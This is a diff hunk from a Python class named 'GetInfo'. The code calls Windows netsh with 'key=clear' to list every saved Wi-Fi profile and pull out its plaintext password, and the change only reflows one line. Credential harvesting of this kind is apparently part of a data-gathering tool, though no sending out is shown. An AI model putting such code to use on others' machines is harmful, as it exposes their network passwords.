@@ -63,9 +63,7 @@ class GetInfo:
         data = check_output(['netsh', 'wlan', 'show', 'profiles']).decode('cp866').split('\n')
         wifi_list = [line.split(':')[1][1:-1] for line in data if "Все профили пользователей" in line]
         for wifi in wifi_list:
-            results = check_output(['netsh', 'wlan', 'show', 'profile', wifi, 'key=clear']).decode(
-                'cp866').split(
-                '\n')
+            results = check_output(['netsh', 'wlan', 'show', 'profile', wifi, 'key=clear']).decode('cp866').split('\n')
             results = [line.split(':')[1][1:-1] for line in results if "Содержимое ключа" in line]
             try:
                 passwords.append(f'Имя сети: {wifi}, Пароль: {results[0]}')
